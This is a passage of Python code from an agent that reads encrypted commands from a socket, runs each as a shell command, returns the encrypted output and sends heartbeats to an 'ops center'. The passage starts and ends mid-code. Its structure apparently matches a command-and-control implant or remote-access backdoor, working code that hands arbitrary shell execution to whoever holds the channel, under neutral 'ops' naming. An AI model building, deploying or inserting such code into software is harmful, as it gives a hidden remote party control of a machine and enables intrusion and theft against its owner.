        # Receive encrypted command
        encrypted_command = sock.recv(1024).decode('utf-8')
        if not encrypted_command:
            return False, "No command received"

        # Decrypt command
        command = decrypt_message(encrypted_command)
        logging.info(f"Received command: {command}")

        # Execute command
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )

        if result.returncode == 0:
            output = result.stdout.strip()
        else:
            output = result.stderr.strip()

        # Return encrypted response
        response = encrypt_message(output)
        sock.send(response.encode('utf-8'))

        return True, output
    except Exception as e:
        logging.warning(f"Command execution failed: {e}")
        return False, str(e)

def send_heartbeat(sock):
    """Send heartbeat to ops center"""
    try:
        # Send encrypted heartbeat
        heartbeat_msg = encrypt_message('HEARTBEAT')
        sock.send(heartbeat_msg.encode('utf-8'))
        response = sock.recv(1024)
        return True, decrypt_message(response.decode('utf-8'))
    except Exception as e:
        logging.warning(f"Heartbeat failed: {e}")
        return False, str(e)

def execute_ops_command():
    """Execute local ops command for status self-check"""
